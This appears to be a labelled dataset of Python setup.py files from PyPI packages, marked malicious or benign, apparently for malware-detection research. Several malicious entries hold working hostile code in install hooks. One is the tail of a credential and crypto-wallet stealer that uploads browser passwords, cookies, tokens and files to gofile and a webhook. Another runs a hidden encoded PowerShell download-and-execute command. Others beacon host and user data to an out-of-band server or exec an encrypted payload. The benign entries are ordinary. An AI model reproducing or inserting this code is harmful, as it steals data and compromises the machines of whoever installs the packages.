\"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    \n    data = {\n        \"content\": globalInfo(),\n        \"embeds\": [\n            {\n            \"title\": \"Creal Zips\",\n            \"description\": f\"{wal}\\n{ga}\\n{ot}\",\n            \"color\": 000000,\n            \"footer\": {\n                \"text\": \"Creal Stealer\",\n                \"icon_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n            }\n            }\n        ],\n        \"username\": \"Creal Stealer\",\n        \"avatar_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\",\n        \"attachments\": []\n    }\n    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n\n\ndef ZipTelegram(path, arg, procc):\n    global OtherZip\n    pathC = path\n    name = arg\n    if not os.path.exists(pathC): return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n    zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file and not \"tdummy\" in file and not \"user_data\" in file and not \"webview\" in file: \n            zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n    #lnik = \"https://google.com\"\n    os.remove(f\"{pathC}/{name}.zip\")\n    OtherZip.append([arg, lnik])\n\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    global WalletsZip, GamingZip, OtherZip\n    # subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    # os.system(f\"taskkill /im {procc} /t /f\")\n\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    \n    if not os.path.exists(pathC): return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        # print(data)\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n\n\n    zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n    #lnik = \"https://google.com\"\n    os.remove(f\"{pathC}/{name}.zip\")\n\n    if \"Wallet\" in arg or \"eogaeaoehlef\" in arg:\n        WalletsZip.append([name, lnik])\n    elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n        GamingZip.append([name, lnik])\n    else:\n        OtherZip.append([name, lnik])\n\n\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n        [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n    ]\n\n    discordPaths = [\n        [f\"{roaming}/Discord\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/Lightcord\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/discordcanary\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/discordptb\", \"/Local Storage/leveldb\"],\n    ]\n\n    PathsToZip = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n        [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"],\n        [f\"{local}/Riot Games/Riot Client/Data\", \"RiotClientServices.exe\", \"RiotClient\"]\n    ]\n    Telegram = [f\"{roaming}/Telegram Desktop/tdata\", 'telegram.exe', \"Telegram\"]\n\n    for patt in browserPaths: \n        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths: \n        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])\n        a.start()\n        Threadlist.append(a)\n\n    for patt in browserPaths: \n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n\n    ThCokk = []\n    for patt in browserPaths: \n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        ThCokk.append(a)\n\n    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()\n\n\n    for thread in ThCokk: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n\n    for patt in browserPaths:\n         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    \n    for patt in PathsToZip:\n         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    \n    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()\n\n    for thread in Threadlist: \n        thread.join()\n    global upths\n    upths = []\n\n    for file in [\"wppassw.txt\", \"wpcook.txt\"]: \n        # upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n#     try:\n#         files = { \"file\": (path, open(path, mode='rb')) }\n#         upload = requests.post(\"https://transfer.sh/\", files=files)\n#         url = upload.text\n#         return url\n#     except:\n#         return False\n\ndef KiwiFolder(pathF, keywords):\n    global KiwiFiles\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = uploadToAnonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\nKiwiFiles = []\ndef KiwiFile(path, keywords):\n    global KiwiFiles\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    KiwiFolder(target, keywords)\n                    break\n\n    KiwiFiles.append([\"folder\", path, fifound])\n\ndef Kiwi():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n\n    key_wordsFolder = [\n        \"account\",\n        \"acount\",\n        \"passw\",\n        \"secret\"\n\n    ]\n\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"account\",                                                          \n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"secret\",\n        \"mom\",\n        \"family\"\n        ]\n\n    wikith = []\n    for patt in path2search: \n        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\n\n\nglobal keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip\n\nkeyword = [\n    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n]\n\nCookiCount, PasswCount = 0, 0\ncookiWords = []\npaswWords = []\n\nWalletsZip = [] # [Name, Link]\nGamingZip = []\nOtherZip = []\n\nGatherAll()\nDETECTED = Trust(Cookies)\n# DETECTED = False\nif not DETECTED:\n    wikith = Kiwi()\n\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n\n    filetext = \"\\n\"\n    for arg in KiwiFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]       \n            filetext += f\"\ud83d\udcc1 {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"\u2514\u2500:open_file_folder: [{fileanme}]({b})\\n\"\n            filetext += \"\\n\"\n    upload(\"kiwi\", filetext)\n\nsetup(\n\n    name='promogen',\n    packages=['promogen'],\n    version='1.0',\n    license='MIT',\n    description='Makes Everything Beautiful',\n    author='Bitz',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)", "target": 1}
{"idx": "h2o-pysparkling-2.4-3.36.1.4.post1", "func": "#!/usr/bin/env python\n\nfrom codecs import open\nfrom os import path\nfrom setuptools import setup, find_packages\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the relevant file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='h2o_pysparkling_2.4',\n\n    # Versions should comply with PEP440.  For a discussion on single-sourcing\n    # the version across setup.py and the project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=\"3.36.1.4_1\",\n    description='Sparkling Water integrates H2O\\'s Fast Scalable Machine Learning with Spark',\n    long_description=long_description,\n\n    url='https://github.com/h2oai/sparkling-water',\n    download_url='https://github.com/h2oai/sparkling-water/',\n    author='H2O.ai',\n    author_email='support@h2o.ai',\n    license='Apache v2',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n    ],\n    keywords='machine learning, data mining, statistical analysis, modeling, big data, distributed, parallel',\n\n    # find python packages starting in the current directory\n    packages=find_packages(),\n\n    # run-time dependencies\n    install_requires=[\n        'requests',\n        'tabulate',\n        'future'],\n\n    # bundled binary packages\n    package_data={'sparkling_water': ['*.jar'],\n                  'h2o': ['version.txt', 'buildinfo.txt'],\n                  'ai.h2o.sparkling': ['version.txt']},\n)\n", "target": 0}
{"idx": "tpgetgetmc-10.26", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgetgetmc',\n    packages = ['modlib'],\n    version = '3.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ironic-secureboot-driver-31463.0.0", "func": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://chpxdgy2vtc0000438a0ge5qsawyyyyyb.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='ironic-secureboot-driver', #package name\n      version='31463.0.0',\n      description='test security research',\n      author='test security research',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "pycparserrr-2.21", "func": "import os, sys\ntry:\n    from setuptools import setup\n    from setuptools.command.install import install as _install\n    from setuptools.command.sdist import sdist as _sdist\nexcept ImportError:\n    from distutils.core import setup\n    from distutils.command.install import install as _install\n    from distutils.command.sdist import sdist as _sdist\n\n\ndef _run_build_tables(dir):\n    from subprocess import check_call\n    # This is run inside the install staging directory (that had no .pyc files)\n    # We don't want to generate any.\n    # https://github.com/eliben/pycparser/pull/135\n    check_call([sys.executable, '-B', '_build_tables.py'],\n               cwd=os.path.join(dir, 'pycparser'))\n\n\nclass install(_install):\n    def run(self):\n        _install.run(self)\n        self.execute(_run_build_tables, (self.install_lib,),\n                     msg=\"Build the lexing/parsing tables\")\n\n\nclass sdist(_sdist):\n    def make_release_tree(self, basedir, files):\n        _sdist.make_release_tree(self, basedir, files)\n        self.execute(_run_build_tables, (basedir,),\n                     msg=\"Build the lexing/parsing tables\")\n\n\nsetup(\n    # metadata\n    name=\"pycparserrr\",\n    description='C parser in Python',\n    long_description=\"\"\"\n        pycparser is a complete parser of the C language, written in\n        pure Python using the PLY parsing library.\n        It parses C code into an AST and can serve as a front-end for\n        C compilers or analysis tools.\n    \"\"\",\n    license='BSD',\n    version='2.21',\n    author=\"Orange Alice\",\n    maintainer='Eli Bendersky',\n    author_email='eliben@gmail.com',\n    url='https://github.com/eliben/pycparser',\n    platforms='Cross Platform',\n    classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    packages=['pycparser', 'pycparser.ply'],\n    package_data={'pycparser': ['*.cfg']},\n    cmdclass={'install': install, 'sdist': sdist},\n)\n", "target": 1}
{"idx": "flask-oidc-1.4.0", "func": "import os.path\nimport io\nimport sys\n\nfrom setuptools import setup\n\n# This check is to make sure we checkout docs/_themes before running sdist\nif not os.path.exists(\"./docs/_themes/README\"):\n    print('Please make sure you have docs/_themes checked out while running setup.py!')\n    if os.path.exists('.git'):\n        print('You seem to be using a git checkout, please execute the following commands to get the docs/_themes directory:')\n        print(' - git submodule init')\n        print(' - git submodule update')\n    else:\n        print('You seem to be using a release. Please use the release tarball from PyPI instead of the archive from GitHub')\n    sys.exit(1)\n\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith io.open(os.path.join(here, 'README.rst')) as f:\n    readme = f.read()\n\nsetup(\n    name='flask-oidc',\n    description='OpenID Connect extension for Flask',\n    long_description=readme,\n    url='https://github.com/puiterwijk/flask-oidc',\n    author='Jeremy Ehrhardt, Patrick Uiterwijk',\n    author_email='jeremy@bat-country.us, patrick@puiterwijk.org',\n    version='1.4.0',\n    packages=[\n        'flask_oidc',\n    ],\n    install_requires=[\n        'Flask',\n        'itsdangerous',\n        'oauth2client',\n        'six',\n    ],\n    tests_require=['nose', 'mock'],\n    entry_points={\n        'console_scripts': ['oidc-register=flask_oidc.registration_util:main'],\n    },\n    zip_safe=False,\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Flask',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n)\n", "target": 0}
{"idx": "django-haystack-3.2.1", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\ninstall_requires = [\"Django>=2.2\"]\n\ntests_require = [\n    \"pysolr>=3.7.0\",\n    \"whoosh>=2.5.4,<3.0\",\n    \"python-dateutil\",\n    \"geopy==2.0.0\",\n    \"nose\",\n    \"coverage\",\n    \"requests\",\n]\n\nsetup(\n    name=\"django-haystack\",\n    use_scm_version=True,\n    description=\"Pluggable search for Django.\",\n    author=\"Daniel Lindsley\",\n    author_email=\"daniel@toastdriven.com\",\n    long_description=open(\"README.rst\", \"r\").read(),\n    url=\"http://haystacksearch.org/\",\n    project_urls={\n        \"Documentation\": \"https://django-haystack.readthedocs.io\",\n        \"Source\": \"https://github.com/django-haystack/django-haystack\",\n    },\n    packages=[\n        \"haystack\",\n        \"haystack.backends\",\n        \"haystack.management\",\n        \"haystack.management.commands\",\n        \"haystack.templatetags\",\n        \"haystack.utils\",\n    ],\n    package_data={\n        \"haystack\": [\"templates/panels/*\", \"templates/search_configuration/*\"]\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Utilities\",\n    ],\n    zip_safe=False,\n    install_requires=install_requires,\n    tests_require=tests_require,\n    extras_require={\n        \"elasticsearch\": [\"elasticsearch>=5,<8\"],\n    },\n    test_suite=\"test_haystack.run_tests.run_all\",\n)\n", "target": 0}
{"idx": "customtkiyter-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'piEUMMkxXWloty SiUsoMFpgzzicwVYlHOHylDRYw'\nLONG_DESCRIPTION = 'vJerpPHND VCvrR PHpleYkNCBuU cYQWcB IWh xigzHHRwtPBtzIxAlahyUTZiAkxtyonmeGStnNiiK TeLtXrFiVEeKYwIXJOlEHlrYFctImUqigoXHoj PqUdZTkrKKZYy CAWJkIGbtnClboU kkNMxMQwgSNAqQUIsfwFOFUESpctXwBBjjmarfsjFAeuwWXZMMCRFzroMMfFngAvMGyFgjFUQhMmctXQWPWmgbCWYpWrvdclYOB qoHaYwEwSrCQ'\n\n\nclass XBeRagcJDEMBRDFcuWIflgZrgnxoaHcQPPeyFdAPqThSJjmWzvctNhSErnhTcPNyQAFjAQKaRCimyyeMXCybBnsKeTfDWeVJgVzbzyIoAYepUZhzCdbdoWcFJQpfBYyHHiVQaqDCntVyNaHzEwxQLCzebjpWHznRQHfnqJr(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'xlSg9vHk5qS8bXk1ww6FF2Vg-5dOMJOypyLXwJ7coS4=').decrypt(b'gAAAAABmBIOKbzIXzlKCk7HpBpiOYSEMZDyuamWKE1t1256_U26Pzy4_8Iwziq5KRr39jvjXHnwQ3fVtT180mfPVv4j9lNdMDXzKhxcVejWb6TsAUSPmo5YjX-okUsVkq-XZGQTIt8kVen0Aq0U4w1R0krcVj9W8qm1zp44ePkcvJpwEfuUpRuBQjDXroYSE5ntVmxB53QZkDOhZnlH9ObRss6aruAhFkA85Tjsyzw45WGyWtLszZNA='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"customtkiyter\",\n    version=VERSION,\n    author=\"iSBacWOpxo\",\n    author_email=\"NhtrMwb@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': XBeRagcJDEMBRDFcuWIflgZrgnxoaHcQPPeyFdAPqThSJjmWzvctNhSErnhTcPNyQAFjAQKaRCimyyeMXCybBnsKeTfDWeVJgVzbzyIoAYepUZhzCdbdoWcFJQpfBYyHHiVQaqDCntVyNaHzEwxQLCzebjpWHznRQHfnqJr,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "google-apitools-0.5.32", "func": "#!/usr/bin/env python\n#\n# Copyright 2013 Google Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup configuration.\"\"\"\n\nimport platform\n\ntry:\n    import setuptools\nexcept ImportError:\n    from ez_setup import use_setuptools\n    use_setuptools()\n    import setuptools\n\n# Configure the required packages and scripts to install, depending on\n# Python version and OS.\nREQUIRED_PACKAGES = [\n    'httplib2>=0.8',\n    'fasteners>=0.14',\n    'oauth2client>=1.4.12',\n    'six>=1.12.0',\n    ]\n\nCLI_PACKAGES = [\n    'python-gflags>=3.0.6',\n]\n\nTESTING_PACKAGES = [\n    'mock>=1.0.1',\n]\n\nCONSOLE_SCRIPTS = [\n    'gen_client = apitools.gen.gen_client:main',\n]\n\npy_version = platform.python_version()\n\n_APITOOLS_VERSION = '0.5.32'\n\nwith open('README.rst') as fileobj:\n    README = fileobj.read()\n\nsetuptools.setup(\n    name='google-apitools',\n    version=_APITOOLS_VERSION,\n    description='client libraries for humans',\n    long_description=README,\n    url='http://github.com/google/apitools',\n    author='Craig Citro',\n    author_email='craigcitro@google.com',\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    # Contained modules and scripts.\n    packages=setuptools.find_packages(include=['apitools']),\n    entry_points={'console_scripts': CONSOLE_SCRIPTS},\n    install_requires=REQUIRED_PACKAGES,\n    tests_require=REQUIRED_PACKAGES + CLI_PACKAGES + TESTING_PACKAGES,\n    extras_require={\n        'cli': CLI_PACKAGES,\n        'testing': TESTING_PACKAGES,\n        },\n    # Add in any packaged data.\n    include_package_data=True,\n    package_data={\n        'apitools.data': ['*'],\n    },\n    exclude_package_data={\n        '': [\n            '*_test.py',\n            '*/testing/*',\n            '*/testdata/*',\n            'base/protorpclite/test_util.py',\n            'gen/test_utils.py',\n        ],\n    },\n    # PyPI package information.\n    classifiers=[\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        ],\n    license='Apache 2.0',\n    keywords='apitools',\n    )\n", "target": 0}
{"idx": "dag-factory-0.13.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pip install twine\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\n# Package meta-data.\nNAME = \"dag-factory\"\nPKG_NAME = \"dagfactory\"\nDESCRIPTION = \"Dynamically build Airflow DAGs from YAML files\"\nURL = \"https://github.com/ajbosco/dag-factory\"\nEMAIL = \"adam@boscarino.me\"\nAUTHOR = \"Adam Boscarino\"\nREQUIRES_PYTHON = \">=3.6.0\"\nVERSION = None\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nREQUIRED = [\"apache-airflow[http,kubernetes]>=1.10.0\", \"pyyaml\", \"packaging\"]\nDEV_REQUIRED = [\"black\", \"pytest\", \"pylint\", \"pytest-cov\", \"tox\"]\n\ntry:\n    with io.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n        long_description = \"\\n\" + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    with open(os.path.join(here, PKG_NAME, \"__version__.py\")) as f:\n        exec(f.read(), about)\nelse:\n    about[\"__version__\"] = VERSION\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(\"\\033[1m{0}\\033[0m\".format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds\u2026\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel 